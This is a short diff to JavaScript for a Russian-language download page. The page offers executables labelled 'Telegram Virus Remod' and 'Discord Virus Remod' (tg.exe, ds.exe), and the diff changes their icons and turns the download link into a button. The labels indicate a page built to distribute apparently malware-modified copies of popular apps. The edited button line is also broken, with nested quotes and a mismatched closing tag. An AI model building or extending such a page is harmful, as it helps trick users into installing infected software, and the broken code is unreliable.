@@ -23,8 +23,8 @@
 
 document.addEventListener('DOMContentLoaded', () => {
   const apps = [
-    { name: "Telegram", icon: "tg.png", description: "Telegram Virus Remod", link: "tg.exe" },
-    { name: "Discord", icon: "ds.png", description: "Discord Virus Remod", link: "ds.exe" }
+    { name: "Telegram", icon: "favicon.ico", description: "Telegram Virus Remod", link: "tg.exe" },
+    { name: "Discord", icon: "favicon.ico", description: "Discord Virus Remod", link: "ds.exe" }
   ];
 
   const list = document.getElementById('app-list');
@@ -39,7 +39,7 @@ document.addEventListener('DOMContentLoaded', () => {
         <div class="app-info">
           <h3 class="app-title">${app.name}</h3>
           <a class="app-description">${app.description}</a>
-          <a href="${app.link}" download class="download-btn">Скачать</a>
+          <button onclick="location.href = "${app.link}"" download class="download-btn">Скачать</a>
         </div>
       `;
       list.appendChild(li);
